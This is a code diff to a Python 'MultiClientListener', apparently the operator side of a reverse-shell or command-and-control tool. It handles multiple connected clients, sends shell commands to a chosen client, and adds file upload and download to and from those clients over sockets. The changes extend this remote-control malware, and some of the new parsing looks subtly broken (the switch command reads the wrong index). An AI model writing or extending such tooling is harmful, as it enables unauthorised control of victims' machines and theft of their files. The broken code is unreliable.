@@ -17,11 +17,12 @@ class MultiClientListener:
     def read_file(self, path):
         try:
             with open(path, "rb") as file:
-                return base64.b16encode(file.read())
+                return base64.b64encode(file.read()).decode(self.format)
         except FileNotFoundError:
             return f"[-]File not found :{path}".encode(self.format)
         except Exception as e:
             return f"[-] File reading file:{str(e)}".encode(self.format)
+     
         
     def writing_file(self,path,content):
         try:
@@ -81,6 +82,7 @@ class MultiClientListener:
                 print("[-] No client selected. Use 'list' and 'switch <id>'.")
         else:
             command = input(f"[Client {self.current_client}] Shell> ")
+            command = command.split(" ")
             self.command_loop(command)  # Send command to the selected client
 
 
@@ -91,6 +93,7 @@ class MultiClientListener:
                 ready, _, _ = select.select([conn], [], [], 1)  # Wait up to 1 second for data
                 if ready:
                     json_data += conn.recv(1024).decode(self.format)
+                    print(f"Received data: {json_data}")
                     return json.loads(json_data)  # Successfully received full data
                 else:
                     return None  # No data received, return None
@@ -147,6 +150,8 @@ class MultiClientListener:
             return
 
         try:
+            if isinstance(data, bytes):
+                data = base64.b64encode(data).decode(self.format)
             json_data = json.dumps(data)
             conn.send(json_data.encode(self.format))  # ✅ Send to the selected client socket
         except BrokenPipeError:
@@ -172,22 +177,36 @@ class MultiClientListener:
     def command_loop(self, command):
         """Handles commands for the selected client."""
         conn = self.client_ids.get(self.current_client)
-        if command.lower() in ["exit", "quit"]:
+
+        if command[0] in ["exit", "quit"]:
             self.current_client = None
-        elif command.lower() == "list":
+
+        elif command[0] == "list":
             self.list_clients()
-        elif command.lower().startswith("switch "):
-            _, client_id = command.split()
+
+        elif command[0] =="switch":
+            client_id = command[2]
             self.switch_client(int(client_id))
-        elif command.lower().startswith("download"):
+
+
+        elif command[0] == "download":
             self.sending_data(command)
             data = self.receiving_data(conn)
             if data:
-                file_name = command.split(" ")[1]
+                file_name = command[1]
                 self.writing_file(file_name, data)
                 print(f"[+]received file content : {file_name}")
             else:
                  print("No data received from client.")
+
+        elif command[0] == "upload":
+            file_content = self.read_file(command[1])
+            if file_content:
+                print("File content read successfully")
+                command = ["upload", command[1], file_content]
+                self.sending_data(command)
+            else:
+                print("no  data found ")
         else:
             if conn:
                 self.sending_data(command)
